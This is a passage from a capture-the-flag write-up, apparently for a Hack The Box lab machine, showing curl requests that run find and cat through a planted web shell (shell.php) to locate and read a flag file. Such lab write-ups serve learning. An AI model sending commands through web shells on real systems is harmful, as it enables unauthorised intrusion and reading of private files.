# Phase 8 — Large Filesystem Search Problem

A full filesystem search was attempted:

```bash
curl "http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20user.txt%202%3E%261"
```

Result:

* Massive permission denied spam.
* No useful signal.

Lesson:

* Blind full-filesystem enumeration creates noise.
* Targeted searches are more effective.

---

# Phase 9 — Searching for Alternative Flag Names

Instead of continuing to search only for `user.txt`, a broader search was performed.

Command:

```bash
curl "http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt%202%3E/dev/null"
```

Result:

```text
/var/www/flag.txt
```

This revealed the flag location.

---

# Phase 10 — Reading the Flag

Command:

```bash
curl "http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
```

This successfully retrieved the flag.

---

# Phase 11 — Understanding the Directory Structure

The current directory was:

```text
/var/www/html
```

But the flag existed in:

```text
/var/www/flag.txt
```

Likely structure:

```text
/var
└── www
    ├── flag.txt
    └── html
        ├── index.php
        ├── shell.php
        └── images/
```

This explained why the flag did not appear in the current working directory.

